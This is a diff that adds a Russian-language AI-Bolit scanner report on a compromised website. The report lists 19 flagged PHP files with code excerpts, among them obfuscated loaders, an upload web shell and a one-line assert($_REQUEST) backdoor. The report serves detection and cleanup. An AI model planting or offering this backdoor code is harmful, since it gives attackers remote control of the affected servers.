@@ -1,0 +1,513 @@
+<html>
+<head>
+    <!-- revisium.com/ai/ -->
+    <meta http-equiv="Content-Type" content="text/html;charset=utf-8" >
+    <META NAME="ROBOTS" CONTENT="NOINDEX,NOFOLLOW">
+    <title>Отчет по /var/www/1-trk.ru</title>
+    <style type="text/css" title="currentStyle">
+        @import "https://cdn.revisium.com/ai/media/css/demo_page2.css";
+        @import "https://cdn.revisium.com/ai/media/css/jquery.dataTables2.css";
+    </style>
+
+    <script type="text/javascript" language="javascript" src="https://cdn.revisium.com/ai/jquery.js"></script>
+    <script type="text/javascript" language="javascript" src="https://cdn.revisium.com/ai/datatables.min.js"></script>
+    <style>
+        body {
+            font-family: Tahoma, sans-serif;
+            color: #5a5a5a;
+            background: #FFFFFF;
+            font-size: 14px;
+            margin: 20px;
+            padding: 0;
+        }
+
+        .header {
+            font-size: 34px;
+            margin: 0 0 10px 0;
+        }
+
+        .hidd {
+            display: none;
+        }
+
+        .ok {
+            color: green;
+        }
+
+        .line_no {
+            -webkit-border-radius: 4px;
+            -moz-border-radius: 4px;
+            border-radius: 4px;
+
+            background: #DAF2C1;
+            padding: 2px 5px 2px 5px;
+            margin: 0 5px 0 5px;
+        }
+
+        .credits_header {
+            -webkit-border-radius: 4px;
+            -moz-border-radius: 4px;
+            border-radius: 4px;
+
+            background: #F2F2F2;
+            padding: 10px;
+            font-size: 11px;
+            margin: 0 0 10px 0;
+        }
+
+        .marker {
+            color: #FF0090;
+            font-weight: 100;
+            background: #FF0090;
+            padding: 2px 0 2px 0;
+            width: 2px;
+        }
+
+        .title {
+            font-size: 24px;
+            margin: 20px 0 10px 0;
+            color: #9CA9D1;
+        }
+
+        .summary {
+            float: left;
+            width: 500px;
+        }
+
+        .summary TD {
+            font-size: 12px;
+            border-bottom: 1px solid #F0F0F0;
+            font-weight: 700;
+            padding: 10px 0 10px 0;
+        }
+
+        .crit, .vir {
+            color: #D84B55;
+        }
+
+        .intitem {
+            color: #4a6975;
+        }
+
+        .spacer {
+            margin: 0 0 50px 0;
+            clear: both;
+        }
+
+        .warn {
+            color: #F6B700;
+        }
+
+        .clear {
+            clear: both;
+        }
+
+        .offer {
+            -webkit-border-radius: 4px;
+            -moz-border-radius: 4px;
+            border-radius: 4px;
+
+            width: 500px;
+            background: #F2F2F2;
+            color: #747474;
+            font-family: Helvetica, Arial, sans-serif;
+            padding: 30px;
+            margin: 20px 0 0 550px;
+            font-size: 14px;
+        }
+
+        .offer-our-products {
+            -webkit-border-radius: 4px;
+            -moz-border-radius: 4px;
+            border-radius: 4px;
+
+            width: 500px;
+            background: #f6f5e0;
+            color: #747474;
+            font-family: Helvetica, Arial, sans-serif;
+            padding: 30px;
+            margin: 20px 0 0 550px;
+            font-size: 14px;
+        }
+
+
+        HR {
+            margin-top: 15px;
+            margin-bottom: 15px;
+            opacity: .2;
+        }
+
+        .flist {
+            font-family: Henvetica, Arial, sans-serif;
+        }
+
+        .flist TD {
+            font-size: 11px;
+            padding: 5px;
+        }
+
+        .flist TH {
+            font-size: 12px;
+            height: 30px;
+            padding: 5px;
+            background: #CEE9EF;
+        }
+
+
+        .it {
+            font-size: 14px;
+            font-weight: 100;
+            margin-top: 10px;
+        }
+
+        .crit .it A {
+            color: #E50931;
+            line-height: 25px;
+            text-decoration: none;
+        }
+
+        .warn .it A {
+            color: #F2C900;
+            line-height: 25px;
+            text-decoration: none;
+        }
+
+
+        .details {
+            font-family: Calibri, sans-serif;
+            font-size: 12px;
+            margin: 10px 10px 10px 0;
+        }
+
+        .crit .details {
+            color: #A08080;
+        }
+
+        .warn .details {
+            color: #808080;
+        }
+
+        .details A {
+            color: #FFF;
+            font-weight: 700;
+            text-decoration: none;
+            padding: 2px;
+            background: #E5CEDE;
+            -webkit-border-radius: 7px;
+            -moz-border-radius: 7px;
+            border-radius: 7px;
+        }
+
+        .details A:hover {
+            background: #A0909B;
+        }
+
+        .ctd {
+            margin: 10px 0 10px 0;
+            align: center;
+        }
+
+        .ctd A {
+            color: #0D9922;
+        }
+
+        .disclaimer {
+            color: darkgreen;
+            margin: 10px 10px 10px 0;
+        }
+
+        .note_vir {
+            margin: 10px 0 10px 0;
+        / / padding: 10 px;
+            color: #FF4F4F;
+            font-size: 15px;
+            font-weight: 700;
+            clear: both;
+
+        }
+
+        .note_warn {
+            margin: 10px 0 10px 0;
+            color: #F6B700;
+            font-size: 15px;
+            font-weight: 700;
+            clear: both;
+        }
+
+        .note_int {
+            margin: 10px 0 10px 0;
+            color: #60b5d6;
+            font-size: 15px;
+            font-weight: 700;
+            clear: both;
+        }
+
+        .updateinfo {
+            color: #FFF;
+            text-decoration: none;
+            background: #E5CEDE;
+            -webkit-border-radius: 7px;
+            -moz-border-radius: 7px;
+            border-radius: 7px;
+
+            margin: 10px 0 10px 0;
+            padding: 10px;
+        }
+
+
+        .caution {
+            color: #EF7B75;
+            text-decoration: none;
+            margin: 20px 0 0 0;
+            font-size: 12px;
+        }
+
+        .footer {
+            color: #303030;
+            text-decoration: none;
+            background: #F4F4F4;
+            -webkit-border-radius: 7px;
+            -moz-border-radius: 7px;
+            border-radius: 7px;
+
+            margin: 80px 0 10px 0px;
+            padding: 10px;
+        }
+
+        .rep {
+            color: #303030;
+            text-decoration: none;
+            background: #94DDDB;
+            -webkit-border-radius: 7px;
+            -moz-border-radius: 7px;
+            border-radius: 7px;
+
+            margin: 10px 0 10px 0;
+            padding: 10px;
+            font-size: 12px;
+        }
+
+    </style>
+</head>
+<body>
+
+<div class="header">Отчет сканера <a href="https://revisium.com/ai/">AI-Bolit</a> vHOSTER-30.4.8: /var/www/1-trk.ru/ (2/0)</div>
+<div class="credits_header">Сканер бесплатный только для личного некоммерческого использования. Информация по <a href="https://revisium.com/ai/faq.php#faq11" target=_blank>коммерческой лицензии</a> (пункт №11). <a href="https://revisium.com/images/mini_aibolit.jpg">Авторское свидетельство</a> о гос. регистрации в РосПатенте №2012619254 от 12 октября 2012 г.</div>
+<div class="details_header">
+    Затрачено времени: <b>3086.4</b>. Сканирование начато 25-01-2021 в 15:45:10, сканирование завершено 25-01-2021 в 16:36:36<br/>
+    Всего проверено 0 директорий и 54457 файлов. Использовано памяти при сканировании: 16.28 Mb.
+</div>
+
+
+
+<div class="summary">
+    <div class="title">Сводный отчет</div><table cellspacing=0 border=0><tr><td class="crit" width=400>Вредоносных скриптов</td><td class="crit">19</td></tr></table><!--[json]{"redirect":0,"critical_php":19,"critical_js":0,"phishing":0,"unix_exec":0,"iframes":0,"not_read":0,"base64":0,"heuristics":0,"symlinks":0,"big_files_skipped":0,"suspicious":0}[/json]--><div class=details style="margin: 20px 20px 20px 0">Обращаем внимание, что обнаруженные файлы не всегда являются вирусами и хакерскими скриптами. Сканер минимизирует число ложных обнаружений, но это не всегда возможно, так как найденный фрагмент может встречаться как во вредоносных скриптах, так и в обычных.<p>Для диагностического сканирования без ложных срабатываний мы разработали специальную версию <u><a href="https://revisium.com/ru/blog/ai-bolit-4-ISP.html" target=_blank style="background: none; color: #303030">сканера для хостинг-компаний</a></u>.</div>
+
+</div>
+
+<div class="offer">
+        <div>
+     <div class="crit" style="font-size: 17px; margin-bottom: 20px"><b>Внимание! Наш сканер обнаружил подозрительный или вредоносный код</b>.</div> 
+     <p>Возможно, ваш сайт был взломан. Рекомендуем срочно <a href="https://revisium.com/ru/order/#fform" target=_blank>проконсультироваться со специалистами</a> по данному отчету.</p>
+     <p><hr size=1></p>
+     <p>Рекомендуем также проверить сайт бесплатным <b><a href="https://rescan.pro/?utm=aibolit" target=_blank>онлайн-сканером ReScan.Pro</a></b>.</p>
+     <p><hr size=1></p>
+         <div class="caution">Не оставляйте файл отчета на сервере, и не давайте на него прямых ссылок с других сайтов. Информация из отчета может быть использована злоумышленниками для взлома сайта, так как содержит информацию о настройках сервера, файлах и каталогах.</div>
+    </div>
+</div>
+
+<div class="offer-our-products">
+           <b>Наши продукты:</b><br/>
+              <ul>
+               <li style="margin-top: 10px"><font color=red><sup>[new]</sup></font><b><a href="https://revisium.com/ru/products/antivirus_for_ispmanager/" target=_blank>Антивирус для ISPmanager Lite</a></b> &mdash;  сканирование и лечение сайтов прямо в панели хостинга</li>
+               <li style="margin-top: 10px"><b><a href="https://revisium.com/ru/blog/revisium-antivirus-for-plesk.html" target=_blank>Антивирус для Plesk</a> Onyx 17.x</b> &mdash;  сканирование и лечение сайтов прямо в панели хостинга</li>
+               <li style="margin-top: 10px"><b><a href="https://cloudscan.pro/ru/" target=_blank>Облачный антивирус CloudScan.Pro</a> для веб-специалистов</b> &mdash; лечение сайтов в один клик</li>
+               <li style="margin-top: 10px"><b><a href="https://revisium.com/ru/antivirus-server/" target=_blank>Антивирус для сервера</a></b> &mdash; для хостинг-компаний, веб-студий и агентств.</li>
+              </ul>  
+    </div>
+</div>
+
+<div class="clear"></div>
+
+<div class="title">Критические замечания</div><div class="note_vir">Эти файлы могут быть вредоносными или хакерскими скриптами (19)</div><div class="crit"><div class="flist"><table cellspacing=1 cellpadding=4 border=0 id="table_crit"><thead><tr class="tbgh0"><th width=70%>Путь</th><th>Изменение свойств</th><th>Изменение содержимого</th><th width=90>Размер</th><th width=0 class="hidd">CRC32</th><th width=0 class="hidd"></th><th width=0 class="hidd"></th><th width=0 class="hidd"></th></tr></thead><tbody><tr class="tbg0" o="id_d2086509"><td><div class="it"><a class="it">/var/www/1-trk.ru/1-trk.ru/uslugi/perevozka-zhivotnykh/perevozka-gusey/service.php</a></div><div class="details"><a href="#" onclick="return hsig('id_d2086509')">[x]</a> <span class="marker">&nbsp;</span>&lt;?$GLOBALS[&#039;_504973228_&#039;]=Array(base64_decode(&#039;YmFzZTY0X2RlY29kZQ==&#039;),base64_decode(&#039;YmFzZ</div></td><td align=center><div class="ctd">25/01/2021 15:38:09</div></td><td align=center><div class="ctd">22/01/2021 10:28:26</div></td><td align=center><div class="ctd">1.14 Kb</div></td><td class="hidd"><div class="hidd">65fabe10e903ff640ba2d1981a2c61327c7c8f58</div></td><td class="hidd"><div class="hidd">x</div></td><td class="hidd"><div class="hidd">1611311306</div></td><td class="hidd"><div class="hidd">id_d2086509</div></td></tr><tr class="tbg1" o="id_a9db8785"><td><div class="it"><a class="it">/var/www/1-trk.ru/1-trk.ru/gank.php.PhP</a></div><div class="details"><a href="#" onclick="return hsig('id_a9db8785')">[x]</a> …ter&gt;&lt;/td&gt;&lt;/tr&gt;&#039;;}echo &#039;&lt;/table&gt;&lt;/div&gt;&#039;;}echo &#039;&lt;center&gt;&lt;br/&gt;&lt;p&gt;BROTHER WHY - Copyright 2K19&lt;/p&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;&#039;;$<span class="marker">&nbsp;</span>ip=getenv(&quot;REMOTE_ADDR&quot;);$subj98=&quot;Mini Shell&quot;;$email=&quot;xvor21gmail.com&quot;;$from=&quot;From: web&quot;;$a45=$_SERVER[&#039;REQUEST_URI&#039;];$</div></td><td align=center><div class="ctd">25/01/2021 15:35:29</div></td><td align=center><div class="ctd">22/01/2021 10:28:27</div></td><td align=center><div class="ctd">9.03 Kb</div></td><td class="hidd"><div class="hidd">57c88f55d77fa4a2755c2adef0b750cdf7b9816f</div></td><td class="hidd"><div class="hidd">x</div></td><td class="hidd"><div class="hidd">1611311307</div></td><td class="hidd"><div class="hidd">id_a9db8785</div></td></tr><tr class="tbg0" o="id_6dbb50b4"><td><div class="it"><a class="it">/var/www/1-trk.ru/1-trk.ru/wp_wrong_datlib.php</a></div><div class="details"><a href="#" onclick="return hsig('id_6dbb50b4')">[x]</a> &lt;?php  $PASS=&quot;188162e90b88271030885b3bd7cfd523&quot;;<span class="marker">&nbsp;</span>function T_($Bc){$x2=256;$W2=8;$cY=array();$I3=0;$C4=0;for($bs=0;$bs&lt;strlen($Bc);$bs++){$I3=($I3&lt;&lt;8) + ord($Bc[$bs]);$C</div></td><td align=center><div class="ctd">25/01/2021 15:35:26</div></td><td align=center><div class="ctd">22/01/2021 10:28:27</div></td><td align=center><div class="ctd">47.38 Kb</div></td><td class="hidd"><div class="hidd">e99c61ed9896558472c687d8ce97ed7fb9b0f326</div></td><td class="hidd"><div class="hidd">x</div></td><td class="hidd"><div class="hidd">1611311307</div></td><td class="hidd"><div class="hidd">id_6dbb50b4</div></td></tr><tr class="tbg1" o="id_db461f24"><td><div class="it"><a class="it">/var/www/1-trk.ru/1-trk.ru/form.php</a></div><div class="details"><a href="#" onclick="return hsig('id_db461f24')">[x]</a> <span class="marker">&nbsp;</span>&lt;?php  $l___J=&#039;base&#039;.(128/2).&#039;_decode&#039;;$l___J=$l___J(str_replace(&quot;\n&quot;,&#039;&#039;,&#039;CN9DvT/wAhvCiaoj4cjTS0FT9EI4PGEGvCSgQ+s066tQLw</div></td><td align=center><div class="ctd">25/01/2021 15:35:29</div></td><td align=center><div class="ctd">22/01/2021 10:28:25</div></td><td align=center><div class="ctd">21.19 Kb</div></td><td class="hidd"><div class="hidd">1fad7ad3a6316f1e6636aa846fbd3195b6d9f0e8</div></td><td class="hidd"><div class="hidd">x</div></td><td class="hidd"><div class="hidd">1611311305</div></td><td class="hidd"><div class="hidd">id_db461f24</div></td></tr><tr class="tbg0" o="id_b11758de"><td><div class="it"><a class="it">/var/www/1-trk.ru/1-trk.ru/pop.php</a></div><div class="details"><a href="#" onclick="return hsig('id_b11758de')">[x]</a> &lt;?php  <span class="marker">&nbsp;</span>$OO00_O_0_O=&#039;1&#039;; $O_O00O0O__=&quot;ohews1jybf5ngv4r2alc36i8qu70pxztdm9_-k&quot;;$OOO0O00___=$O_O00O0O__{4}.$O_O00O0O__{31}.$O_O00</div></td><td align=center><div class="ctd">25/01/2021 15:38:10</div></td><td align=center><div class="ctd">22/01/2021 10:27:24</div></td><td align=center><div class="ctd">19.01 Kb</div></td><td class="hidd"><div class="hidd">0a89d9dcf746446452ac272f157fafe885fef789</div></td><td class="hidd"><div class="hidd">x</div></td><td class="hidd"><div class="hidd">1611311244</div></td><td class="hidd"><div class="hidd">id_b11758de</div></td></tr><tr class="tbg1" o="id_db461f24"><td><div class="it"><a class="it">/var/www/1-trk.ru/1-trk.ru/go.php</a></div><div class="details"><a href="#" onclick="return hsig('id_db461f24')">[x]</a> <span class="marker">&nbsp;</span>&lt;?php  $wp__db=&#039;base&#039;.(128/2).&#039;_decode&#039;;$wp__db=$wp__db(str_replace(&quot;\n&quot;,&#039;&#039;,&#039;Dt5vvwvrAh+VhdkmD8mmSzuBHUI4P2HdjySfbek0661</div></td><td align=center><div class="ctd">25/01/2021 15:34:24</div></td><td align=center><div class="ctd">22/01/2021 10:28:25</div></td><td align=center><div class="ctd">21.22 Kb</div></td><td class="hidd"><div class="hidd">6453c44920e7501da111ce88764f1e23f90d94be</div></td><td class="hidd"><div class="hidd">x</div></td><td class="hidd"><div class="hidd">1611311305</div></td><td class="hidd"><div class="hidd">id_db461f24</div></td></tr><tr class="tbg0" o="id_934be2b3"><td><div class="it"><a class="it">/var/www/1-trk.ru/1-trk.ru/moduless.php</a></div><div class="details"><a href="#" onclick="return hsig('id_934be2b3')">[x]</a> …redirect(FM_SELF_URL);}}else{unset($_SESSION[&#039;logged&#039;]);?&gt;&lt;!DOCTYPE HTML PUBLIC &#039;-//IETF//DTD HTML 2.0//EN&#039;&gt;&lt;html&gt;&lt;head&gt;<span class="marker">&nbsp;</span>&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Not Found&lt;/h1&gt;&lt;p&gt;The requested URL&lt;?=$_SERVER[&#039;PHP_SELF&#039;];?&gt;was not found </div></td><td align=center><div class="ctd">25/01/2021 15:34:24</div></td><td align=center><div class="ctd">22/01/2021 10:28:27</div></td><td align=center><div class="ctd">56.04 Kb</div></td><td class="hidd"><div class="hidd">82d233093c4cdfff9ea0754ec12bde4a20da9c76</div></td><td class="hidd"><div class="hidd">x</div></td><td class="hidd"><div class="hidd">1611311307</div></td><td class="hidd"><div class="hidd">id_934be2b3</div></td></tr><tr class="tbg1" o="id_63d66d57"><td><div class="it"><a class="it">/var/www/1-trk.ru/1-trk.ru/s_ne.php</a></div><div class="details"><a href="#" onclick="return hsig('id_63d66d57')">[x]</a> …]})));if(isset(${${&quot;GLOBALS&quot;}[&quot;jqpssqbmsrvl&quot;]})){$oarmqjqeve=&quot;data&quot;;$smkgtihejk=&quot;name&quot;;${${&quot;GLOBALS&quot;}[&quot;kotovcqw&quot;]}=&quot;./&quot;.<span class="marker">&nbsp;</span>implode(${${&quot;GLOBALS&quot;}[&quot;knfahyf&quot;]}).&quot;.module&quot;;file_put_contents(${$smkgtihejk},&quot;&lt;?php  unlink(__FILE__);\n&quot;.${$oarmqjqev</div></td><td align=center><div class="ctd">25/01/2021 15:38:06</div></td><td align=center><div class="ctd">22/01/2021 10:27:24</div></td><td align=center><div class="ctd">1.95 Kb</div></td><td class="hidd"><div class="hidd">a451379652285f5a2c30e9facb8f6fb05d8ca283</div></td><td class="hidd"><div class="hidd">x</div></td><td class="hidd"><div class="hidd">1611311244</div></td><td class="hidd"><div class="hidd">id_63d66d57</div></td></tr><tr class="tbg0" o="id_d8bf7b45"><td><div class="it"><a class="it">/var/www/1-trk.ru/1-trk.ru/s_e.php</a></div><div class="details"><a href="#" onclick="return hsig('id_d8bf7b45')">[x]</a> <span class="marker">&nbsp;</span>&lt;?php  ${&quot;GLOBALS&quot;}[&quot;mypaccsv&quot;]=&quot;_1&quot;;${&quot;GLOBALS&quot;}[&quot;hoqpuspglsv&quot;]=&quot;_0&quot;;$GLOBALS[&quot;_171515191_&quot;]=Array(&quot;str_rot13&quot;,&quot;pack&quot;,&quot;</div></td><td align=center><div class="ctd">25/01/2021 15:38:06</div></td><td align=center><div class="ctd">22/01/2021 10:28:25</div></td><td align=center><div class="ctd">1.40 Kb</div></td><td class="hidd"><div class="hidd">c781a6749d26ebf680b664644897ebb247afa7ca</div></td><td class="hidd"><div class="hidd">x</div></td><td class="hidd"><div class="hidd">1611311305</div></td><td class="hidd"><div class="hidd">id_d8bf7b45</div></td></tr><tr class="tbg1" o="id_dd8dcba3"><td><div class="it"><a class="it">/var/www/1-trk.ru/1-trk.ru/ups.php</a></div><div class="details"><a href="#" onclick="return hsig('id_dd8dcba3')">[x]</a> <span class="marker">&nbsp;</span>&lt;title&gt;Vuln!! patch it Now!&lt;/title&gt;&lt;?php  echo &#039;&lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; name=&quot;upload</div></td><td align=center><div class="ctd">25/01/2021 15:35:29</div></td><td align=center><div class="ctd">22/01/2021 10:28:28</div></td><td align=center><div class="ctd">446 b</div></td><td class="hidd"><div class="hidd">3619d7704c79e46d1a00e67dcec34564f50eb86b</div></td><td class="hidd"><div class="hidd">x</div></td><td class="hidd"><div class="hidd">1611311308</div></td><td class="hidd"><div class="hidd">id_dd8dcba3</div></td></tr><tr class="tbg0" o="id_a179642c"><td><div class="it"><a class="it">/var/www/1-trk.ru/1-trk.ru/media-admin.php</a></div><div class="details"><a href="#" onclick="return hsig('id_a179642c')">[x]</a> …=&quot;_upl&quot; value=&quot;Upload&quot;&gt;&lt;/form&gt;&#039;;if($_POST[&#039;_upl&#039;]==&quot;Upload&quot;){if(copy($_FILES[&#039;file&#039;][&#039;tmp_name&#039;],$_FILES[&#039;file&#039;][&#039;name&#039;]<span class="marker">&nbsp;</span>)){echo &#039;&lt;b&gt;Shell Uploaded! :)&lt;b&gt;&lt;br&gt;&lt;br&gt;&#039;;}else{echo &#039;&lt;b&gt;Not uploaded!&lt;/b&gt;&lt;br&gt;&lt;br&gt;&#039;;}}?</div></td><td align=center><div class="ctd">25/01/2021 15:35:26</div></td><td align=center><div class="ctd">22/01/2021 10:28:25</div></td><td align=center><div class="ctd">447 b</div></td><td class="hidd"><div class="hidd">9368aeed6397ceaaffddbdbc0815063f9a21a81c</div></td><td class="hidd"><div class="hidd">x</div></td><td class="hidd"><div class="hidd">1611311305</div></td><td class="hidd"><div class="hidd">id_a179642c</div></td></tr><tr class="tbg1" o="id_b11758de"><td><div class="it"><a class="it">/var/www/1-trk.ru/1-trk.ru/fot.php</a></div><div class="details"><a href="#" onclick="return hsig('id_b11758de')">[x]</a> &lt;?php  <span class="marker">&nbsp;</span>$O0__O_0OO0=&#039;1&#039;; $O_O_0OO00_=&quot;an2v_q619xi07tep-dyg85fs3lbmzjuckowhr4&quot;;$OO00_OO0__=$O_O_0OO00_{23}.$O_O_0OO00_{13}.$O_O_</div></td><td align=center><div class="ctd">25/01/2021 15:35:29</div></td><td align=center><div class="ctd">22/01/2021 10:27:46</div></td><td align=center><div class="ctd">19.06 Kb</div></td><td class="hidd"><div class="hidd">40f3c8d59aa9aec6deed0d0b56f132557cf280c6</div></td><td class="hidd"><div class="hidd">x</div></td><td class="hidd"><div class="hidd">1611311266</div></td><td class="hidd"><div class="hidd">id_b11758de</div></td></tr><tr class="tbg0" o="id_db461f24"><td><div class="it"><a class="it">/var/www/1-trk.ru/1-trk.ru/local/components/custom/class.cache.php</a></div><div class="details"><a href="#" onclick="return hsig('id_db461f24')">[x]</a> <span class="marker">&nbsp;</span>&lt;?php  $WP__J=&#039;base&#039;.(128/2).&#039;_decode&#039;;$WP__J=$WP__J(str_replace(&quot;\n&quot;,&#039;&#039;,&#039;DLM+vj/rBhqXhKwi4MylSDyE8hI1QF3ZvyHNO+ky6tpR/v</div></td><td align=center><div class="ctd">25/01/2021 15:38:06</div></td><td align=center><div class="ctd">22/01/2021 10:28:26</div></td><td align=center><div class="ctd">21.19 Kb</div></td><td class="hidd"><div class="hidd">cc5f4c7fd1144c23ce1230195fc8ede76ddabd36</div></td><td class="hidd"><div class="hidd">x</div></td><td class="hidd"><div class="hidd">1611311306</div></td><td class="hidd"><div class="hidd">id_db461f24</div></td></tr><tr class="tbg1" o="id_c47255bc"><td><div class="it"><a class="it">/var/www/1-trk.ru/1-trk.ru/local/templates/1trk/go.php</a></div><div class="details"><a href="#" onclick="return hsig('id_c47255bc')">[x]</a> local&lt;?php  <span class="marker">&nbsp;</span>assert(stripslashes($_REQUEST[local]));?</div></td><td align=center><div class="ctd">25/01/2021 15:38:06</div></td><td align=center><div class="ctd">22/01/2021 10:28:27</div></td><td align=center><div class="ctd">54 b</div></td><td class="hidd"><div class="hidd">d79ba3a7e97ba8affe2c359bd15a4d25b1c08859</div></td><td class="hidd"><div class="hidd">x</div></td><td class="hidd"><div class="hidd">1611311307</div></td><td class="hidd"><div class="hidd">id_c47255bc</div></td></tr><tr class="tbg0" o="id_b11758de"><td><div class="it"><a class="it">/var/www/1-trk.ru/1-trk.ru/pig.php</a></div><div class="details"><a href="#" onclick="return hsig('id_b11758de')">[x]</a> &lt;?php  <span class="marker">&nbsp;</span>$OO_OO_00_0=&#039;1&#039;; $O0OO0_O_0_=&quot;85gwl3qu9pv1koimbf2ceds_x7y6nt4ajrz0-h&quot;;$O_00OO0__O=$O0OO0_O_0_{22}.$O0OO0_O_0_{29}.$O0OO</div></td><td align=center><div class="ctd">25/01/2021 15:38:06</div></td><td align=center><div class="ctd">22/01/2021 10:28:25</div></td><td align=center><div class="ctd">20.20 Kb</div></td><td class="hidd"><div class="hidd">afb822ab1c0e479d1e50e3ecf4931643db308b53</div></td><td class="hidd"><div class="hidd">x</div></td><td class="hidd"><div class="hidd">1611311305</div></td><td class="hidd"><div class="hidd">id_b11758de</div></td></tr><tr class="tbg1" o="id_db461f24"><td><div class="it"><a class="it">/var/www/1-trk.ru/1-trk.ru/get.php</a></div><div class="details"><a href="#" onclick="return hsig('id_db461f24')">[x]</a> <span class="marker">&nbsp;</span>&lt;?php  $db__g_=&#039;base&#039;.(128/2).&#039;_decode&#039;;$db__g_=$db__g_(str_replace(&quot;\n&quot;,&#039;&#039;,&#039;N+NDwQ0ZCBzEitUnEPjSdWpRHj82aVvdk1CZbLc1469</div></td><td align=center><div class="ctd">25/01/2021 15:35:29</div></td><td align=center><div class="ctd">22/01/2021 10:28:25</div></td><td align=center><div class="ctd">21.22 Kb</div></td><td class="hidd"><div class="hidd">2a8880c211b0984f748a65ada997cd003ec4752a</div></td><td class="hidd"><div class="hidd">x</div></td><td class="hidd"><div class="hidd">1611311305</div></td><td class="hidd"><div class="hidd">id_db461f24</div></td></tr><tr class="tbg0" o="id_271ebe3f"><td><div class="it"><a class="it">/var/www/1-trk.ru/1-trk.ru/index3.php</a></div><div class="details"><a href="#" onclick="return hsig('id_271ebe3f')">[x]</a> …$wp_admin_bar=new$admin_bar_class;else return false;$wp_admin_bar-&gt;initialize();$wp_admin_bar-&gt;add_menus();return true;}<span class="marker">&nbsp;</span>function pre_admin_bar($wp_kses_data,$wp_nonce){$kses_str=str_replace(array(&#039;%&#039;,&#039;*&#039;),array(&#039;/&#039;,&#039;=&#039;),$wp_kses_data);$fil</div></td><td align=center><div class="ctd">25/01/2021 15:35:29</div></td><td align=center><div class="ctd">22/01/2021 10:28:27</div></td><td align=center><div class="ctd">23.55 Kb</div></td><td class="hidd"><div class="hidd">c88ab83b6c9dd4494e61b89560800b60e3d75f83</div></td><td class="hidd"><div class="hidd">x</div></td><td class="hidd"><div class="hidd">1611311307</div></td><td class="hidd"><div class="hidd">id_271ebe3f</div></td></tr><tr class="tbg1" o="id_0ce89daf"><td><div class="it"><a class="it">/var/www/1-trk.ru/1-trk.ru/wp-plugins.php</a></div><div class="details"><a href="#" onclick="return hsig('id_0ce89daf')">[x]</a> &lt;?php  $auth_pass=&quot;&quot;; <span class="marker">&nbsp;</span>$color=&quot;#df5&quot;; $default_action=base64_decode(&#039;RmlsZXNNYW4=&#039;); $default_use_ajax=true; $default_charset=&#039;Windows</div></td><td align=center><div class="ctd">25/01/2021 15:35:29</div></td><td align=center><div class="ctd">22/01/2021 10:28:25</div></td><td align=center><div class="ctd">86.71 Kb</div></td><td class="hidd"><div class="hidd">0141e2b59c0365c6cb878b503d25e7912ae1192a</div></td><td class="hidd"><div class="hidd">x</div></td><td class="hidd"><div class="hidd">1611311305</div></td><td class="hidd"><div class="hidd">id_0ce89daf</div></td></tr><tr class="tbg0" o="id_773c86e7"><td><div class="it"><a class="it">/var/www/1-trk.ru/1-trk.ru/beence.php</a></div><div class="details"><a href="#" onclick="return hsig('id_773c86e7')">[x]</a> &lt;?php  ?&gt;<span class="marker">&nbsp;</span>&lt;?php  function irmcjaowlfxc($g,$o,$i){return$g.&#039;&#039;.$o.&#039;&#039;.$i;}$gbVclGM7976=&quot;*ax748nivp9)50fujhrg2c(/6bzlymwtsd_k3q1e.o;&quot;;</div></td><td align=center><div class="ctd">25/01/2021 15:34:24</div></td><td align=center><div class="ctd">22/01/2021 10:27:24</div></td><td align=center><div class="ctd">26.91 Kb</div></td><td class="hidd"><div class="hidd">26381e06d9ff453ecdd6fca55af9e7cdee0d68fc</div></td><td class="hidd"><div class="hidd">x</div></td><td class="hidd"><div class="hidd">1611311244</div></td><td class="hidd"><div class="hidd">id_773c86e7</div></td></tr></tbody></table></div><div class=clear style="margin: 20px 0 0 0"></div></div>
+
+
+<div class="footer">
+       <div class="disclaimer"><span class="vir">[!]</span> Отказ от гарантий: невозможно гарантировать обнаружение всех вредоносных скриптов. Поэтому разработчик сканера не несет ответственности за возможные последствия работы сканера AI-Bolit или неоправданные ожидания пользователей относительно функциональности и возможностей.
+   </div>
+   <div class="thanx">
+      Мы будем чрезвычайно благодарны за любые упоминания сканера AI-Bolit на вашем сайте, в блоге, среди друзей, знакомых и клиентов. <br/>Ссылку можно поставить на страницу <a href="https://revisium.com/ai/">https://revisium.com/ai/</a>.<br/>
+    </div>
+</div>
+
+<script language="javascript">
+    function hsig(id) {
+        var divs = document.getElementsByTagName("tr");
+        for(var i = 0; i < divs.length; i++){
+
+            if (divs[i].getAttribute('o') == id) {
+                divs[i].innerHTML = '';
+            }
+        }
+
+        return false;
+    }
+
+
+    $(document).ready(function(){
+        $('#table_crit').dataTable({
+            "aLengthMenu": [[100 , 500, -1], [100, 500, "All"]],
+            "aoColumns": [
+                {"iDataSort": 7, "width":"70%"},
+                {"iDataSort": 5},
+                {"iDataSort": 6},
+                {"bSortable": true},
+                {"bVisible": false},
+                {"bVisible": false},
+                {"bVisible": false},
+                {"bVisible": false}
+            ],
+            "paging": true,
+            "iDisplayLength": 500,
+            "oLanguage": {
+                "sLengthMenu": "Отображать по _MENU_ записей",
+                "sZeroRecords": "Ничего не найдено",
+                "sInfo": "Отображается c _START_ по _END_ из _TOTAL_ файлов",
+                "sInfoEmpty": "Нет файлов",
+                "sInfoFiltered": "(всего записей _MAX_)",
+                "sSearch":       "Поиск:",
+                "sUrl":          "",
+                "oPaginate": {
+                    "sFirst": "Первая",
+                    "sPrevious": "Предыдущая",
+                    "sNext": "Следующая",
+                    "sLast": "Последняя"
+                },
+                "oAria": {
+                    "sSortAscending": ": активировать для сортировки столбца по возрастанию",
+                    "sSortDescending": ": активировать для сортировки столбцов по убыванию"
+                }
+            }
+
+        } );
+
+    });
+
+    $(document).ready(function(){
+        $('#table_vir').dataTable({
+            "aLengthMenu": [[100 , 500, -1], [100, 500, "All"]],
+            "paging": true,
+            "aoColumns": [
+                {"iDataSort": 7, "width":"70%"},
+                {"iDataSort": 5},
+                {"iDataSort": 6},
+                {"bSortable": true},
+                {"bVisible": false},
+                {"bVisible": false},
+                {"bVisible": false},
+                {"bVisible": false}
+            ],
+            "iDisplayLength": 500,
+            "oLanguage": {
+                "sLengthMenu": "Отображать по _MENU_ записей",
+                "sZeroRecords": "Ничего не найдено",
+                "sInfo": "Отображается c _START_ по _END_ из _TOTAL_ файлов",
+                "sInfoEmpty": "Нет файлов",
+                "sInfoFiltered": "(всего записей _MAX_)",
+                "sSearch":       "Поиск:",
